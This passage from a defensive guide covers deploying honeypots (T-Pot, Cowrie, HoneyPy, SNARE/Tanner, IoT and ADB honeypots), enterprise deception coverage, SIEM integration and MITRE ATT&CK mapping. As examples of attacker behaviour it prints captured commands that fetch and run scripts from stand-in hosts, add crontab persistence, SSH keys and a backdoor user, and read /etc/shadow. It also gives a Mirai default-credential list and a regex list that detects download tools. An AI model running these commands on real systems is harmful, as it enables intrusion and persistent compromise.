### 5.2 T-Pot Installation

**Requirements**: Debian 11/12 or Ubuntu 22.04, minimum 8GB RAM, 128GB storage, static IP

```bash
# Download and run installer
git clone https://github.com/telekom-security/tpotce.git
cd tpotce

# Run installer (interactive)
sudo ./install.sh

# Select installation type:
# - Standard (all honeypots + full ELK)
# - Sensor (honeypots + log forwarding to central T-Pot)
# - Industrial (ICS/SCADA honeypots)
# - Mobile (lightweight for low-resource systems)

# After installation, reboot
sudo reboot

# Access Kibana dashboard
# https://your-tpot-ip:64297
# Default credentials set during installation

# SSH management port (changed from 22 to avoid honeypot conflict)
ssh -p 64295 user@your-tpot-ip
```

### 5.3 Included Honeypots

**Cowrie**: SSH/Telnet medium-interaction honeypot (see Section 5.5)

**Dionaea**: Malware capture honeypot for SMB, HTTP, FTP (see Section 4)

**Elasticpot**: Elasticsearch honeypot on port 9200. Captures attackers targeting misconfigured ES instances. Common attack pattern: querying index list followed by data exfiltration.

**HoneyPy**: Modular Python honeypot (see Section 6.1)

**Honeytrap**: Go-based honeypot that dynamically creates listeners on probed ports. Any port scan that hits a closed port gets a listener created for that port on subsequent connections.

**Mailoney**: SMTP honeypot. Captures email spam relay attempts and credential stuffing against mail servers.

**Rdpy**: RDP honeypot. Captures Remote Desktop Protocol connection attempts and credential attacks. Critical for detecting lateral movement in Windows environments.

**Snare/Tanner**: Web application honeypot (see Section 6.2)

**Heralding**: Credential capture honeypot supporting FTP, HTTP, HTTPS, SSH, SMTP, POP3, IMAP, LDAP, MSSQL, MySQL, PostgreSQL, RDP, VNC.

**CitrixHoneypot**: Emulates Citrix ADC (CVE-2019-19781) to capture exploitation attempts.

**ConPot**: ICS/SCADA honeypot. Emulates Siemens S7 PLC, Modbus, DNP3. Critical for OT/ICS environments.

**GridPot**: Smart grid honeypot implementing DNP3 and IEC 60870 protocols.

**IPPHoney**: Internet Printing Protocol honeypot on port 631. Captures printer exploitation attempts.

**ADBHoney**: Android Debug Bridge honeypot on port 5555. Captures Android device exploitation (common in IoT botnet activity).

**CiscoASA**: Emulates Cisco ASA VPN to capture CVE-2018-0101 and similar ASA exploits.

**Log4Pot**: Log4Shell (CVE-2021-44228) honeypot. Captures JNDI injection attempts.

### 5.4 Kibana Dashboards

T-Pot provides pre-built Kibana dashboards:
- **T-Pot Overview**: All honeypot activity summary
- **Attack Map**: Real-time world map of attack origins
- **Cowrie Dashboard**: SSH/Telnet specific analytics
- **Suricata Dashboard**: IDS alert correlation
- **Individual honeypot dashboards**: One per included honeypot

**Community Feed**: T-Pot installations optionally contribute anonymized attack data to the T-Pot community feed, providing global threat intelligence aggregation.

### 5.5 Cowrie SSH/Telnet Honeypot

Cowrie is the most widely deployed medium-interaction SSH/Telnet honeypot. It presents a convincing fake shell environment to attackers, recording their every command.

**Installation (standalone)**:
```bash
# Create dedicated user
sudo adduser --disabled-password cowrie
sudo su - cowrie

# Install
git clone https://github.com/cowrie/cowrie.git
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install --upgrade pip
pip install -r requirements.txt

# Configure
cp etc/cowrie.cfg.dist etc/cowrie.cfg

# Key settings in cowrie.cfg:
# [honeypot]
# hostname = prod-webserver-01    <- fake hostname shown to attackers
# log_path = var/log/cowrie
# download_path = var/lib/cowrie/downloads
#
# [output_jsonlog]
# enabled = true
# logfile = var/log/cowrie/cowrie.json
#
# [ssh]
# enabled = true
# listen_port = 2222
#
# [telnet]
# enabled = true
# listen_port = 2323

# Redirect port 22 to Cowrie
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2323

# Start
bin/cowrie start
```

### 5.6 Cowrie Fake Filesystem

Cowrie presents a fake filesystem to attackers. The filesystem image is customizable:

```bash
# Fake filesystem is stored as a binary image in:
# cowrie/share/cowrie/

# Populate with realistic content using fsctl:
bin/fsctl share/cowrie/honeyfs
# > ls /
# > addfile /etc/passwd /real/system/etc/passwd
# > exit

# Custom /etc/passwd with fake accounts:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:112:118:MySQL Server:/nonexistent:/bin/false
```

### 5.7 Cowrie Session Recording

All attacker sessions are recorded in ttyrec format (terminal recording):

```
var/log/cowrie/tty/
  20240115-143022-192.168.1.100-1234.log      # raw log
  20240115-143022-192.168.1.100-1234.ttylog   # ttyrec recording
```

**Playback**:
```bash
# Replay attacker session
bin/playlog var/log/cowrie/tty/20240115-143022-192.168.1.100-1234.ttylog
```

### 5.8 Common Captured Behaviors

**Cryptocurrency Miners**: The most common payload. Attackers download xmrig or similar miners:
```bash
# Typical captured commands:
wget http://malicious.site/miner.sh -O /tmp/.x
chmod +x /tmp/.x
/tmp/.x &
# or
curl http://c2.example.com/install.sh | bash
```

**Lateral Movement Attempts**:
```bash
# Captured reconnaissance commands:
cat /etc/passwd
cat /etc/shadow
ls /home
ps aux
netstat -an
ifconfig
uname -a
hostname
whoami
id
```

**Persistence Mechanisms**:
```bash
# Captured persistence attempts:
echo "* * * * * curl http://c2/payload | bash" >> /etc/crontab
echo "ssh-rsa AAAA... attacker@evil" >> /root/.ssh/authorized_keys
useradd -m -s /bin/bash -G sudo backdoor
```

### 5.9 Cowrie Output Plugins

**JSON Log** (default): Structured JSON for SIEM ingestion
**ELK Output**: Direct Elasticsearch output
**MISP**: Threat intelligence platform integration
**Splunk**: HEC (HTTP Event Collector) output
**Slack**: Real-time notifications
**VirusTotal**: Automatic submission of downloaded malware

**Splunk HEC configuration**:
```ini
[output_splunk]
enabled = true
url = https://splunk.corp.example.com:8088/services/collector/event
token = your-hec-token
index = honeypot
sourcetype = cowrie
```

**MISP output configuration**:
```ini
[output_misp]
enabled = true
base_url = https://misp.corp.example.com
misp_key = your-misp-api-key
misp_verifycert = true
publish_event = false
tags = honeypot, cowrie, tlp:amber
```
## Part 6: HoneyPy, Tanner/SNARE, and IoT Honeypots

### 6.1 HoneyPy

HoneyPy is a low-interaction, modular honeypot written in Python. Its plugin architecture makes it highly customizable for specific environments.

**Installation**:
```bash
git clone https://github.com/foospidy/HoneyPy.git
cd HoneyPy
pip install -r requirements.txt

# Configure
cp etc/honeypy.cfg.example etc/honeypy.cfg
# Edit honeypy.cfg to enable/disable services

# Start
python honeypy.py
```

**Configuration** `etc/honeypy.cfg`:
```ini
[honeypy]
log_file = log/honeypy.log
log_to_console = True
log_to_file = True
log_to_syslog = False
log_to_splunk = False
splunk_host = localhost
splunk_port = 8888

[services]
# Enable/disable individual service modules
tcp_service_example = True
udp_service_example = False
```

**Available Plugins**:
- `Adb`: Android Debug Bridge (port 5555)
- `Chargen`: Character generator protocol
- `Daytime`: Daytime protocol
- `Dns`: DNS server emulation
- `Echo`: Echo service
- `Ftp`: FTP service
- `Http`: HTTP web server
- `Https`: HTTPS web server
- `Irc`: IRC server
- `Memcache`: Memcached emulation
- `Mongodb`: MongoDB emulation (port 27017)
- `Mqtt`: IoT MQTT broker emulation
- `Mysql`: MySQL emulation
- `Redis`: Redis emulation
- `Smb`: SMB emulation
- `Smtp`: SMTP mail server
- `Ssh`: SSH service
- `Telnet`: Telnet service
- `Tftp`: TFTP service
- `Vnc`: VNC service

**Custom Plugin Development**:
```python
# HoneyPy plugin template
from twisted.internet.protocol import Protocol, Factory
from twisted.internet import reactor

class MyServiceProtocol(Protocol):
    def connectionMade(self):
        peer = self.transport.getPeer()
        print(f"Connection from {peer.host}:{peer.port}")
        # Log to HoneyPy logging system
        self.factory.honeypot.log(
            src_host=peer.host,
            src_port=peer.port,
            dest_port=self.factory.port,
            data="connection"
        )
        # Send fake banner
        self.transport.write(b"220 MyService Ready
")

    def dataReceived(self, data):
        # Log received data
        print(f"Data received: {data}")
        self.transport.loseConnection()

class MyServiceFactory(Factory):
    protocol = MyServiceProtocol
    def __init__(self, honeypot, port):
        self.honeypot = honeypot
        self.port = port
```

### 6.2 SNARE and Tanner — Web Application Honeypot

**SNARE** (Super Next Generation Advanced Reactive Honeypot) clones real websites to create convincing web application honeypots. **Tanner** is the backend analysis engine that classifies attacks.

**Architecture**:
- SNARE: Web server that presents cloned pages and captures HTTP requests
- Tanner: Analysis server that receives captured requests from SNARE and classifies attack types

**SNARE Installation**:
```bash
pip install snare

# Clone a target website for the honeypot
sudo snare --cloner http://example.com --dir /opt/snare/pages/

# Run SNARE honeypot
sudo snare --port 8080 --page-dir /opt/snare/pages/example.com     --tanner 127.0.0.1 --no-dorks false
```

**Tanner Installation**:
```bash
pip install tanner

# Start Redis (required for Tanner)
redis-server &

# Start Tanner
tanner
```

**Attack Classification** (Tanner):
- **SQL Injection (SQLi)**: Detected via pattern matching and actual query execution against SQLite
- **Cross-Site Scripting (XSS)**: Detected via script injection patterns
- **Local File Inclusion (LFI)**: Detected via path traversal patterns
- **Remote File Inclusion (RFI)**: Detected via URL inclusion patterns
- **XML External Entity (XXE)**: Detected via XML payload analysis
- **Server-Side Template Injection (SSTI)**: Detected via template expression patterns
- **Command Injection**: Detected via shell metacharacter patterns
- **CSRF**: Detected via cross-origin request patterns

**Tanner configuration** `~/.tanner/tanner.cfg`:
```yaml
[Redis]
host: localhost
port: 6379
poolsize: 80

[Logger]
log_level: DEBUG
log_file: /tmp/tanner.log

[SqliteAnalyzer]
db_name: /tmp/tanner.db

[Api]
host: 0.0.0.0
port: 8090
```

### 6.3 Telnet IoT Honeypots and Mirai Capture

IoT botnets (especially Mirai and its variants) heavily target Telnet (port 23) with default credential brute-forcing. Specialized IoT honeypots capture these attacks.

**telnet-iot-honeypot**:
```bash
git clone https://github.com/Phype/telnet-iot-honeypot
cd telnet-iot-honeypot
pip install -r requirements.txt
python honeypot.py
```

**Captured Mirai Infection Sequence**:
1. Scanner bot connects to Telnet (port 23)
2. Attempts default credentials (admin/admin, root/root, root/xc3511, etc.)
3. Upon successful authentication, runs `uname -a` to identify architecture
4. Downloads architecture-specific binary via wget or tftp:
```bash
# Typical captured commands:
/bin/busybox wget http://malware.site/bins/mirai.arm -O /tmp/mirai.arm
chmod 777 /tmp/mirai.arm
/tmp/mirai.arm
# or using base64 encoded binary:
echo f0VMRgIBAQAAAAAAAAAAAAMAA... | base64 -d > /tmp/m && chmod +x /tmp/m && /tmp/m
# or using TFTP:
tftp -g -r mirai.mips malware.site
```
5. Binary executes and phones home to C2

**Captured Default Credential List** (common Mirai targets):
```
root:xc3511, root:vizxv, root:admin, admin:admin, root:888888
root:xmhdipc, root:default, root:juantech, root:123456, root:54321
support:support, root:root, admin:password, root:1111111, admin:1234
root:66666666, root:password, root:1234, admin:12345, user:user
```

### 6.4 MTPot — Telnet IoT Honeypot

MTPot is a simple Telnet honeypot specifically designed to capture IoT malware:

```bash
git clone https://github.com/Cymmetria/MTPot
cd MTPot
pip install -r requirements.txt

# Configure
cp config.ini.example config.ini
# Edit: port, log file, credentials to accept

python mtpot.py
```

### 6.5 ElasticHoney — Elasticsearch Honeypot

Targets Elasticsearch exposed on port 9200, one of the most commonly exploited internet-facing services:

```bash
git clone https://github.com/jordan-wright/elastichoney
cd elastichoney
go build

# Configure
cp config.example.json config.json
# Edit: port, log file, Slack webhook

./elastichoney
```

**Common captured attacks against Elasticsearch**:
```
GET /_cat/indices
GET /_cluster/stats
GET /_nodes
GET /customer_data/_search?size=10000
GET /users/_search?q=*:*&size=9999
```

### 6.6 Common IoT Attacker Patterns

**Architecture Detection**: Attackers check CPU architecture before downloading appropriate binary:
```bash
uname -a  # Common first command
cat /proc/cpuinfo  # Architecture details
```

**Multi-Architecture Dropper** (common captured dropper script):
```bash
#!/bin/sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget -q http://malware.site/install.sh -O- | sh
```

**Persistence on IoT devices**:
```bash
# Attempt to survive reboots
echo "*/1 * * * * /tmp/.x" >> /etc/crontabs/root
# Inject into init scripts
echo "/tmp/.x &" >> /etc/rc.local
# Kill competing malware (resource competition)
kill $(cat /tmp/.pid)
rm /tmp/.pid
```

**Botnet Commands Observed**:
- DDoS flood commands (UDP/TCP/HTTP flood)
- Port scan commands (internal network spreading)
- Credential brute-force relay commands
- Proxy/SOCKS setup for anonymization

### 6.7 ADBHoney — Android Debug Bridge Honeypot

ADBHoney emulates the Android Debug Bridge port (5555/TCP), commonly targeted by Android malware distribution botnets:

```bash
git clone https://github.com/huuck/ADBHoney
cd ADBHoney
pip install -r requirements.txt
python adbhoney.py --port 5555
```

**Common ADB attack patterns**:
```bash
# Attacker commands captured via ADB:
adb connect target:5555
adb shell pm install -r malware.apk
adb shell am start -n com.malware/.MainActivity
adb shell monkey -p com.malware 1
```

**Notable captured malware**: Satori, Fbot, and other Mirai-derived botnets extended their scanning to include ADB port 5555 after discovering millions of exposed Android devices (primarily Android TV boxes and phones with debug mode enabled).
## Part 7: Enterprise Deception at Scale

### 7.1 Coverage Model

Enterprise deception deployment follows a density-based coverage model. The goal is to ensure that any attacker performing lateral movement, network discovery, or credential access will encounter a decoy.

**Recommended Density**:
- **One honeypot per VLAN/subnet**: At minimum, one honeypot system per network segment. Prefer 2-3 per segment for redundancy and protocol coverage.
- **One honeytoken per sensitive file share**: Every file share containing sensitive data should have at least one honeyfile with embedded callback.
- **One decoy account per Active Directory OU**: Decoy service accounts in each OU, with monitoring for any authentication attempt.
- **One canary credential per credential store**: Fake credentials in every password manager, secrets vault, and configuration file repository.
- **One fake admin share per server**: UNC paths to non-existent admin shares that trigger alerts on access attempt.

**Coverage Calculation**:
```
Coverage_Score = (Monitored_Paths / Total_Attacker_Paths) x 100%

Where Total_Attacker_Paths includes:
- Network segments x services per segment
- File shares x sensitive directories
- Active Directory OUs x privileged accounts
- Cloud accounts x IAM roles
- Code repositories x secret locations
```

### 7.2 Service Portfolio Per Decoy

Each honeypot node should emulate multiple services to maximize detection surface:

**Windows Server Decoy**:
- SMB (445): File sharing
- RDP (3389): Remote desktop
- WinRM (5985/5986): Remote management
- MSSQL (1433): Database
- HTTP/HTTPS (80/443): IIS web server
- LDAP (389): Domain controller emulation

**Linux Server Decoy**:
- SSH (22): Remote access
- HTTP/HTTPS (80/443): Web server
- MySQL (3306): Database
- Redis (6379): Cache
- Docker API (2375): Container management
- Kubernetes API (6443): Orchestration

**Network Infrastructure Decoy**:
- SNMP (161): Network management
- Telnet (23): Legacy management
- SSH (22): Network device management
- HTTP (80): Web management interface
- TFTP (69): Configuration download

**Database Server Decoy**:
- MySQL (3306)
- PostgreSQL (5432)
- MSSQL (1433)
- Oracle (1521)
- MongoDB (27017)
- Elasticsearch (9200)
- Redis (6379)

### 7.3 Commercial Deception Platforms

**Attivo Networks (now part of SentinelOne)**:
- Automated decoy deployment and management
- Dynamic decoy refresh to prevent fingerprinting
- Active Directory assessment and canary accounts
- Threat path visualization
- Automated incident response integration
- Cloud (AWS/Azure/GCP) deception coverage

**SentinelOne Singularity Ranger Deception**:
- Agent-based deception on existing endpoints
- Fake credentials and files planted by the agent
- Network decoys created dynamically
- Integration with SentinelOne EDR for correlated response
- Identity-based deception (fake cached credentials)

**Illusive Networks**:
- Agentless deception via network-level injection
- Deceptive credentials planted in memory without agents
- Active Directory deception
- Attack surface reduction through deception data analysis
- Real-time attacker visualization

**Acalvio ShadowPlex**:
- Fluid deception: decoys that adapt to network changes
- Autonomous deception planning using AI
- Cloud and OT/ICS support
- Threat dossier generation for each attacker session
- Integration with SOAR platforms

**Cymmetria MazeRunner** (acquired by CrowdStrike):
- Breadcrumb planting for attacker misdirection
- Deception grid deployment
- Trail analysis for attacker path reconstruction

### 7.4 SIEM Integration Architecture

**Integration Principle**: ALL honeypot alerts = P1 priority. No tuning, no threshold, no false positives. Any alert from a honeypot system demands immediate investigation.

**Syslog Integration** (universal):
```yaml
# Filebeat configuration for all honeypots
filebeat.inputs:
- type: log
  paths:
    - /var/log/cowrie/cowrie.json
    - /opt/dionaea/var/log/dionaea/*.log
    - /opt/opencanary/logs/*.log
  fields:
    alert_type: honeypot
    priority: P1
    false_positive_rate: 0

output.logstash:
  hosts: ["siem.corp.example.com:5044"]
```

**Microsoft Sentinel Integration** (KQL analytics rule):
```kql
Syslog
| where HostName has_any ("honeypot", "canary", "decoy")
| extend
    AlertPriority = "P1",
    FalsePositiveRate = 0,
    RequiresImmediate = true
| project TimeGenerated, HostName, SyslogMessage, Computer, AlertPriority
```

**Splunk Integration**:
```spl
index=honeypot
| eval priority="P1"
| eval false_positive="impossible"
| stats count by src_ip, honeypot_type, service
| sort -count
| table src_ip, honeypot_type, service, count, priority
```

**Palo Alto XSOAR Playbook** (triggered on honeypot alert):
1. Immediately block source IP at perimeter firewall
2. Query SIEM for other activity from same source IP
3. Check EDR for any endpoints communicating with source IP
4. Generate threat intelligence report
5. Notify SOC team via PagerDuty
6. Create incident ticket in ServiceNow
7. Submit source IP to threat intelligence platform

### 7.5 Threat Intelligence Extraction

**TTPs (Tactics, Techniques, Procedures)**:
```python
import json
from pymisp import PyMISP, MISPEvent

misp = PyMISP('https://misp.corp.example.com', 'API_KEY')

def process_cowrie_log(log_file):
    with open(log_file) as f:
        for line in f:
            event_data = json.loads(line)
            if event_data.get('eventid') == 'cowrie.command.input':
                command = event_data.get('input', '')
                src_ip = event_data.get('src_ip', '')

                event = MISPEvent()
                event.info = f"Honeypot command capture from {src_ip}"
                event.add_attribute('ip-src', src_ip)
                event.add_attribute('text', command, comment='Attacker command')
                misp.add_event(event)
```

**Malware C2 Extraction**:
```python
import re

def extract_c2_from_commands(commands):
    c2_patterns = [
        r'wget\s+https?://([^\s/]+)',
        r'curl\s+https?://([^\s/]+)',
        r'tftp\s+-g\s+-r\s+\S+\s+(\S+)',
        r'nc\s+(\d+\.\d+\.\d+\.\d+)',
    ]
    c2_indicators = []
    for pattern in c2_patterns:
        matches = re.findall(pattern, ' '.join(commands))
        c2_indicators.extend(matches)
    return list(set(c2_indicators))
```

### 7.6 KPIs and Metrics

**Primary KPIs**:
- **Intrusion Detection Rate**: Percentage of intrusions detected by honeypots vs. total intrusions
- **Mean Time to Detect (MTTD)**: Average time from honeypot alert to SOC acknowledgment (target: under 15 minutes)
- **Attack Path Intelligence**: Number of unique attacker TTPs documented per quarter
- **Honeypot Coverage**: Percentage of network segments with at least one active honeypot
- **Alert Fidelity**: All honeypot alerts are true positives (100% by definition)

**Secondary KPIs**:
- Malware samples captured per month
- Unique attacker IPs observed
- New C2 infrastructure identified
- Credential stuffing attempts (per service)
- Geographic distribution of attacks

**Monthly Report Template**:
```
Honeypot Activity Report
=========================================
Total Alerts: N
Unique Source IPs: N
Malware Samples Captured: N
New C2 Infrastructure Identified: N
Top Attacked Services: SSH, SMB, HTTP
MTTD (Average): N minutes
Incidents Escalated: N
```

### 7.7 Deception-in-Depth Strategy

The most effective enterprise deception programs layer multiple deception technologies:

**Layer 1 — Network**: Honeypot VMs on every VLAN (OpenCanary or T-Pot)
**Layer 2 — Service**: Protocol-specific emulation for common attacker targets
**Layer 3 — Identity**: AD canary accounts, AWS honey keys, cached fake credentials
**Layer 4 — Data**: Honeyfiles in every sensitive share, canarytoken documents
**Layer 5 — Application**: Web app honeypots for internet-facing services
**Layer 6 — Cloud**: Decoy S3 buckets, fake Lambda functions, canary cloud API keys

With all six layers active, attacker detection probability exceeds 95% for any lateral movement attempt within the network. The remaining 5% represents highly targeted, slow-and-low attacks that deliberately avoid known deception indicators — a level of sophistication that itself indicates an advanced persistent threat (APT).
## Part 8: MITRE D3FEND and ATT&CK Mapping

### 8.1 MITRE D3FEND Deception Techniques

MITRE D3FEND is the defensive complement to ATT&CK, providing a knowledge base of defensive cybersecurity techniques. The deception category includes:

**D3-HN: Honeypot Network**
- Definition: A network of decoy systems designed to attract and monitor attackers
- Implementation: Dedicated VLAN with honeypot systems, isolated from production
- Detection Coverage: Network reconnaissance, lateral movement, exploitation attempts
- Related ATT&CK: T1046, T1135, T1021, T1190
- Platforms: All (network-level)

**D3-HS: Honeypot Service**
- Definition: A decoy network service that appears to be a legitimate service but exists solely to detect unauthorized access
- Implementation: OpenCanary, Cowrie, Dionaea, HoneyPy
- Detection Coverage: Service exploitation, credential brute-force, protocol abuse
- Related ATT&CK: T1110, T1078, T1021, T1190
- Platforms: All (service-level)

**D3-DA: Decoy Account**
- Definition: A user account created specifically to detect unauthorized credential use
- Implementation: AD canary accounts, AWS IAM honey keys, local admin decoys
- Detection Coverage: Credential theft, pass-the-hash, golden ticket attacks
- Related ATT&CK: T1078, T1110, T1555, T1558
- Platforms: Windows, Linux, Cloud

**D3-DF: Decoy File**
- Definition: A file that appears to contain sensitive information but exists to detect unauthorized access
- Implementation: Canarytokens Word/PDF, inotify-watched honeyfiles
- Detection Coverage: Data exfiltration, insider threat, ransomware reconnaissance
- Related ATT&CK: T1083, T1005, T1074, T1530
- Platforms: Windows, Linux, macOS, Cloud Storage

**D3-DU: Decoy Credential**
- Definition: Fake credentials (passwords, keys, tokens) planted to detect credential theft
- Implementation: Fake passwords in browsers, fake API keys in config files, canary SSH keys
- Detection Coverage: Credential harvesting, credential spraying, C2 pivoting
- Related ATT&CK: T1555, T1552, T1212, T1110
- Platforms: All

**D3-DN: Decoy Network Resource**
- Definition: Fake network resources (shares, printers, services) that attract attacker enumeration
- Implementation: Phantom SMB shares, fake printers, decoy intranet pages
- Detection Coverage: Network share discovery, resource enumeration
- Related ATT&CK: T1135, T1046, T1083
- Platforms: Windows, Linux

### 8.2 ATT&CK Technique Detection Table

| ATT&CK ID | Technique | Honeypot Type | Detection Method | Alert Priority | Response Action |
|-----------|-----------|---------------|-----------------|----------------|-----------------|
| T1046 | Network Service Scanning | Any honeypot + OpenCanary port scan detection | TCP SYN to honeypot ports, Nmap fingerprinting | P1 | Block source IP, investigate source host |
| T1110 | Brute Force | Cowrie (SSH), OpenCanary (all), Heralding | Multiple failed auth attempts against honeypot | P1 | Block source IP, check for successful auth on real systems |
| T1021.001 | Remote Services: RDP | Rdpy (T-Pot), OpenCanary | RDP connection to honeypot | P1 | Block source IP, check for lateral movement |
| T1021.002 | Remote Services: SMB | Dionaea, OpenCanary SMBD, Cowrie | SMB connection/auth to honeypot | P1 | Block source IP, check for ransomware indicators |
| T1021.004 | Remote Services: SSH | Cowrie, OpenCanary | SSH connection to honeypot | P1 | Block source IP, investigate for persistence |
| T1021.006 | Remote Services: WinRM | OpenCanary, custom | WinRM connection to honeypot | P1 | Block source IP, check for lateral movement |
| T1135 | Network Share Discovery | OpenCanary SMBD, Dionaea | SMB enumeration of honeypot shares | P1 | Block source IP, check for data staging |
| T1078 | Valid Accounts | AD canary account, Canarytokens | Logon event with canary credentials | P1 Critical | Immediate incident response, assume full compromise |
| T1555 | Credentials from Password Stores | Canary credentials in browsers/vaults | Canary credential use | P1 Critical | Immediate incident response, rotate all credentials |
| T1040 | Network Sniffing | Canary cleartext credentials | Canary credential capture and reuse | P1 | Investigate network interception, check for MITM |
| T1190 | Exploit Public-Facing Application | Dionaea, Elasticpot, Log4Pot, CitrixHoneypot | Exploit attempt/success on honeypot | P1 | Block source IP, check for same exploit on real systems |
| T1595 | Active Scanning | OpenCanary portscan, Cowrie | Port scan detection | P2 | Monitor source IP, correlate with other activity |
| T1592 | Gather Victim Host Info | OpenCanary, Cowrie | Service banner harvesting | P2 | Monitor source IP |
| T1083 | File and Directory Discovery | Cowrie, Honeyfile access | ls/dir commands in honeypot, honeyfile access | P1 | Block source IP if honeyfile accessed |
| T1003 | OS Credential Dumping | Cowrie, AD canary | Mimikatz-like commands in honeypot | P1 Critical | Immediate incident response |
| T1059 | Command and Scripting Interpreter | Cowrie | Shell command execution in honeypot | P1 | Analyze commands for TTP extraction, block source |
| T1105 | Ingress Tool Transfer | Cowrie, Dionaea | wget/curl/tftp to download malware | P1 | Block source IP, submit malware to VT/MalwareBazaar |
| T1053 | Scheduled Task/Job | Cowrie | Crontab modification in honeypot | P1 | Block source IP, check production systems |
| T1547 | Boot or Logon Autostart | Cowrie | /etc/rc.local or init modification | P1 | Block source IP |
| T1496 | Resource Hijacking | Cowrie | Miner download/execution detection | P1 | Block source IP, C2 infrastructure extraction |

### 8.3 Detection Coverage by Attack Phase

**Reconnaissance Phase** (ATT&CK TA0043):
- Honeypots detect: Active scanning (T1595), network service scanning (T1046), host discovery
- Tools: OpenCanary port scan detection, any honeypot connection attempt
- Coverage: HIGH — any automated scanner will hit honeypots

**Initial Access Phase** (ATT&CK TA0001):
- Honeypots detect: Exploit public-facing application (T1190), valid accounts (T1078)
- Tools: Dionaea, Elasticpot, Log4Pot, CitrixHoneypot, AD canary accounts
- Coverage: MEDIUM-HIGH — depends on honeypot placement relative to attack vector

**Execution Phase** (ATT&CK TA0002):
- Honeypots detect: Command and scripting interpreter (T1059), user execution
- Tools: Cowrie (captures all commands in fake shell), Tanner (web app commands)
- Coverage: HIGH for SSH/web vectors

**Lateral Movement Phase** (ATT&CK TA0008):
- Honeypots detect: Remote services (T1021), internal spearphishing
- Tools: Cowrie, OpenCanary SMBD, Rdpy, Heralding
- Coverage: VERY HIGH — lateral movement almost always hits honeypots if deployed at 1 per subnet

**Credential Access Phase** (ATT&CK TA0006):
- Honeypots detect: Brute force (T1110), credentials from stores (T1555)
- Tools: Cowrie, Heralding, AD canary accounts, canary credentials
- Coverage: HIGH

### 8.4 Complete Tool Comparison Table

| Tool | Type | Interaction Level | Protocols | Malware Capture | SIEM Integration | License | Best For |
|------|------|-----------------|-----------|----------------|-----------------|---------|----------|
| OpenCanary | Network honeypot | Low | 15+ protocols | No | Syslog/JSON | Apache 2.0 | Enterprise VLAN coverage |
| Cowrie | SSH/Telnet honeypot | Medium | SSH, Telnet | Yes (downloads) | JSON/ELK/Splunk | BSD | SSH attack analysis |
| Dionaea | Malware capture | Low-Medium | SMB/HTTP/FTP/SQL | Yes (binaries) | SQLite/SIEM | LGPL | Malware collection |
| T-Pot | Multi-honeypot platform | Low-High | 20+ honeypots | Yes | Built-in ELK | Apache 2.0 | Comprehensive research |
| Canarytokens | Honeytoken service | N/A (data artifact) | Web/DNS/SMB | No | Webhook/Email | Free SaaS / Apache 2.0 | Credential/file detection |
| HoneyPy | Modular honeypot | Low | 20+ via plugins | No | Syslog/Splunk | MIT | Custom protocol emulation |
| SNARE/Tanner | Web app honeypot | Medium | HTTP/HTTPS | No | JSON/ELK | GNU GPLv3 | Web attack analysis |
| Heralding | Credential capture | Low | 12+ protocols | No | JSON/Syslog | GPL | Credential theft detection |
| Elasticpot | ES honeypot | Low | HTTP (ES API) | No | JSON | Apache 2.0 | Cloud/ES attack detection |
| Thinkst Canary | Commercial | Medium-High | 20+ protocols | No | Full SOC integration | Commercial | Enterprise deployment |
| Attivo/SentinelOne | Commercial platform | High | Full deception fabric | Yes | Full SIEM/SOAR | Commercial | Enterprise deception program |

### 8.5 Deployment Checklist

**Pre-Deployment**:
- Define honeypot IP addresses (unused IPs in production subnets)
- Ensure honeypot IPs are excluded from DHCP pools
- Remove honeypot IPs from DNS (should not resolve)
- Configure firewall rules to allow inbound to honeypot, block outbound
- Set up centralized logging (SIEM) to receive honeypot alerts
- Create P1 incident response playbook for honeypot alerts
- Notify IT staff that honeypot IPs are decoys (to prevent internal false alarms)
- Configure NTP synchronization for accurate timestamps

**Post-Deployment**:
- Verify honeypot services are responding on expected ports
- Test alert pipeline (trigger a test connection, verify alert received)
- Confirm logs are flowing to SIEM
- Validate P1 incident response workflow
- Document all honeypot IP addresses in CMDB/asset inventory (marked as decoy)
- Schedule quarterly review of honeypot effectiveness
- Set up automated malware sample submission (VirusTotal/MalwareBazaar)

**Maintenance**:
- Monthly: Review captured attack data, update threat intelligence
- Quarterly: Rotate honeypot IPs and banners to prevent fingerprinting
- Semi-annually: Add new protocol emulation based on current threat landscape
- Annually: Review and update deception strategy based on ATT&CK updates

### 8.6 Quick Reference: Honeypot Selection Guide

**I need to detect network reconnaissance** -> OpenCanary with port scan detection enabled

**I need to capture SSH brute-force and attacker commands** -> Cowrie

**I need to capture malware binaries** -> Dionaea (focus on SMB/445)

**I need a comprehensive research platform** -> T-Pot

**I need to detect credential theft** -> Canarytokens (AWS keys, AD account, Word docs)

**I need to detect data exfiltration from file shares** -> Honeyfiles with canarytokens

**I need to detect IoT botnet scanning** -> Cowrie on Telnet port 23 or MTPot

**I need to detect web application attacks** -> SNARE/Tanner

**I need enterprise-grade managed deception** -> Thinkst Canary (commercial) or Attivo/SentinelOne

**I need ICS/SCADA honeypots** -> ConPot (included in T-Pot)

**I need to detect lateral movement in Windows environments** -> OpenCanary with SMB enabled + AD canary accounts in every OU
